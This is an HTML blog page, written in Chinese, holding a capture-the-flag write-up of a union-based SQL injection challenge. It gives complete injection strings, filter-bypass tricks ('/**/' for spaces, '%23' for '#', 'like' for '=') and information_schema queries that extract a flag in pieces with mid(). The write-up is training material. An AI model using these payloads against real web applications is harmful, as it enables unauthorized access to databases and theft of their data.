@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="在学了SQL注入以后就迫不及待地想练练手，发现这一题好像有点难度，就总结一下 首先打开网页，映入眼帘的是我们熟悉的男人——杰哥 但是比起这个，这个信息更吸引我 编辑 注意看，这个网页提醒我们，“参数是wllm”。 编辑 通过抓包，我们发现这里需要传入GET型参数，那么我们先随便传入一个数字试一试这里显示正常 编辑 那么我们先按照正常的步骤操作，再判断有几列，把“wllm&#x3D;1 order">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2024/10/24/sql/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="在学了SQL注入以后就迫不及待地想练练手，发现这一题好像有点难度，就总结一下 首先打开网页，映入眼帘的是我们熟悉的男人——杰哥 但是比起这个，这个信息更吸引我 编辑 注意看，这个网页提醒我们，“参数是wllm”。 编辑 通过抓包，我们发现这里需要传入GET型参数，那么我们先随便传入一个数字试一试这里显示正常 编辑 那么我们先按照正常的步骤操作，再判断有几列，把“wllm&#x3D;1 order">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/d63bf45760ac0d91004db99a9bfda0c3.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/392c80add77866bf792e8b364c3257dd.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e4bfb1e25be18f168aa8ed49631827db.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/199f7ba9125f35b15d4f941208abec35.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/31ab5ee5638dfe9364d1d36afd4eea34.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/81b44a8cf0da4d155327e41372cd785b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/9fcbf914ed3f893ace7f18e0f69e4c49.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4bb3dc51e71e83e303c6977c82afa6e5.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4f5720c8ebd439ded2934b41937c1814.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/3c66a70813ec673f1bfbc99e84a17342.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/319955169d557e570306d18db62f39ac.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/cb95708154fbeca8d7bef81f0319d758.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/789f63c3c221ba2cd40e865ba1472ae6.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4cbd12ef0201767e5933079c798e3df0.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4c8c7df1dae996316c01d3da9f483642.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/b4f33abb1d10b3794a025141a768795b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/f1489555b7d121b92084cda798cb84be.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/5b95b4dd5b602bcdc9d55d028a61b993.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/a3ff7e9311c38d41c0965452b1bcf175.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e37c74a3dd2c5fcc8c2e85ad2a04141c.png">
+<meta property="article:published_time" content="2024-10-24T13:36:24.590Z">
+<meta property="article:modified_time" content="2024-10-24T13:36:24.590Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i-blog.csdnimg.cn/blog_migrate/d63bf45760ac0d91004db99a9bfda0c3.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/24/sql/" class="article-date">
+  <time class="dt-published" datetime="2024-10-24T13:36:24.590Z" itemprop="datePublished">2024-10-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在学了SQL注入以后就迫不及待地想练练手，发现这一题好像有点难度，就总结一下</p>
+<p>首先打开网页，映入眼帘的是我们熟悉的男人——杰哥</p>
+<p>但是比起这个，这个信息更吸引我</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d63bf45760ac0d91004db99a9bfda0c3.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>注意看，这个网页提醒我们，“参数是wllm”。</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/392c80add77866bf792e8b364c3257dd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>通过抓包，我们发现这里需要传入GET型参数，那么我们先随便传入一个数字试一试这里显示正常</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e4bfb1e25be18f168aa8ed49631827db.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>那么我们先按照正常的步骤操作，再判断有几列，把“wllm&#x3D;1 order by 4”传进去             </p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/199f7ba9125f35b15d4f941208abec35.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑这里显示出错误，那么我们就要想到是不是联合注入，尝试一下                            <img src="https://i-blog.csdnimg.cn/blog_migrate/31ab5ee5638dfe9364d1d36afd4eea34.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>这里翻译过来的意思就是“您的 SQL 语法有错误;查看与您的 MariaDB 服务器版本相对应的手册，了解在第 1 行的“1”LIMIT 0,1“附近使用的正确语法”，这里我们起码知道了这是一个联合注入，那么事情就好办了。</p>
+<p>这里我们把问题描述直接发给gpt，解释如下</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/81b44a8cf0da4d155327e41372cd785b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>但是，首先，排除1和2，然后想到会不会是后端过滤掉了一些特殊符号，也就是这里的第四条。那么试试，首先把空格替换为“&#x2F;**&#x2F;”，结果如下：                                         </p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9fcbf914ed3f893ace7f18e0f69e4c49.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑这里发现还不行，但是我们这段代码如果有问题就只能是结尾的”#“有问题，它应该也被过滤了，这里我们把”#“替换成“%23”（url编码）试一试              </p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4bb3dc51e71e83e303c6977c82afa6e5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑这里终于显示出我们所期盼的结果了，依次减少列数，这里就不再演示，列数为3，那么就只需要把模板套进去就行了。首先输入”wllm&#x3D;0’  union select 1,2,database()“，记得把空格替换成”&#x2F;**&#x2F;“以及结尾输入”%23“ 。下面三个查询命令同样如此，不再赘述。                                                     </p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4f5720c8ebd439ded2934b41937c1814.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑 这里显示库名称为”test_db“，再输入”“      </p>
+<p>wllm&#x3D;0’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;”test_db”                                                                 <img src="https://i-blog.csdnimg.cn/blog_migrate/3c66a70813ec673f1bfbc99e84a17342.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑                  </p>
+<p>但是 这里又出问题了，看了其他大神的解释发现，这里结尾的”&#x3D;“也被过滤了，那么用”like“替换它，</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/319955169d557e570306d18db62f39ac.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑                                                                      </p>
+<p>这里显示有两个表，很明显我们要查找的表是”LTLT_flag“，再输入”wllm&#x3D;0’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D; “LTLT_flag”</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/cb95708154fbeca8d7bef81f0319d758.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>然后再输入</p>
+<p>“wllm&#x3D;0’ union select 1,2,flag from test_db.LTLT_flag”</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/789f63c3c221ba2cd40e865ba1472ae6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>好消息：我们得到了flag，坏消息，这个flag只有一部分，这里我们可以使用right函数。此函数相关解释如下：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4cbd12ef0201767e5933079c798e3df0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4c8c7df1dae996316c01d3da9f483642.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>先查看该函数是否被禁用，查看一个函数是否被禁用，只需要再url编码后面添加该函数的名字即可</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b4f33abb1d10b3794a025141a768795b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>这里发现right函数被禁用。</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/f1489555b7d121b92084cda798cb84be.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>幸运的是，mid函数为被禁用</p>
+<p>那么接下来开始操作 </p>
+<p>下面的最终代码可以直接拷贝粘贴，不需要再替换空格之类的</p>
+<p>​       输入“?wllm&#x3D;0’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,2,mid(flag,1,20)&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;test_db.LTLT_flag%23”                                                      <img src="https://i-blog.csdnimg.cn/blog_migrate/5b95b4dd5b602bcdc9d55d028a61b993.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>再输入“?wllm&#x3D;0’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,2,mid(flag,21,40)&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;test_db.LTLT_flag%23”</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/a3ff7e9311c38d41c0965452b1bcf175.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>再输入</p>
+<p>“?wllm&#x3D;0’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;1,2,mid(flag,41,60)&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;test_db.LTLT_flag%23”</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e37c74a3dd2c5fcc8c2e85ad2a04141c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>把三段字符拼接出来就得到了最终的flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/24/sql/" data-id="cm49k7n3a000br4s7a24d6mik" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/11/12/%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E5%A4%A7%E5%85%A8/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/10/24/%E5%89%8D%E7%AB%AF%E5%90%8E%E7%BC%80%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%8B%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8B%E8%9A%81%E5%89%91/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/12/04/%E7%BD%91%E9%BC%8E%E6%9D%AF-fillll-put/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/18/phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/18/platform/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/18/%E5%B8%A6%E4%BD%A0%E8%B5%B0%E8%BF%9BPHP%20session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/11/12/%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E5%A4%A7%E5%85%A8/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
